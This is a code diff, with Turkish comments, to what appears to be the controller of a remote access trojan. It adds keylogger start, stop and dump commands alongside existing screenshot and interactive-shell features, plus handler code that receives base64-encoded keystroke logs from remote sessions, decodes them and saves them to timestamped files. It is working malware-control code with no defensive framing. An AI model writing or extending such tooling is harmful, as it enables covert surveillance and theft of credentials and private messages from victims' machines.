@@ -285,6 +285,9 @@ class Handler(BaseHandler):
 
 [Gözetleme]
   screenshot            - Anlık ekran görüntüsü al (RAM üzerinden)
+  keylogger_start       - Keylogger başlat (Windows)
+  keylogger_stop        - Keylogger durdur
+  keylogger_dump        - Tuş kayıtlarını getir ve kaydet
 
 [Komut Çalıştırma]
   shell                 - İnteraktif shell başlat
@@ -440,6 +443,38 @@ class Handler(BaseHandler):
                             print(f"    Format: {ext.upper()}")
                         except Exception as e:
                             print(f"[!] Screenshot kaydetme hatası: {str(e)}")
+
+                    # Keylogger Dökümü: Gelen logları kaydet
+                    elif response.startswith("KEYLOG_DUMP:"):
+                        try:
+                            b64_logs = response.split(":", 1)[1]
+                            logs = base64.b64decode(b64_logs).decode('utf-8')
+                            
+                            # logs klasörünü oluştur
+                            logs_dir = os.path.join(os.getcwd(), "logs")
+                            os.makedirs(logs_dir, exist_ok=True)
+                            
+                            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+                            filename = f"keylog_{timestamp}_session{self.session_id}.txt"
+                            save_path = os.path.join(logs_dir, filename)
+                            
+                            with open(save_path, "w", encoding="utf-8") as f:
+                                f.write(logs)
+                                
+                            print(f"[+] ⌨️ Keylogger dökümü alındı!")
+                            print(f"    Dosya : {save_path}")
+                            print(f"    Boyut : {len(logs)} karakter")
+                            print("-" * 40)
+                            # Ekrana da bas (kısaca)
+                            lines = logs.split('\n')
+                            print("\n".join(lines[:10])) # İlk 10 satırı göster
+                            if len(lines) > 10:
+                                print(f"... (toplam {len(lines)} satır)")
+                            print("-" * 40)
+                                
+                        except Exception as e:
+                            print(f"[!] Keylog kaydetme hatası: {str(e)}")
+                            
                     else:
                         print(response)
                 else:
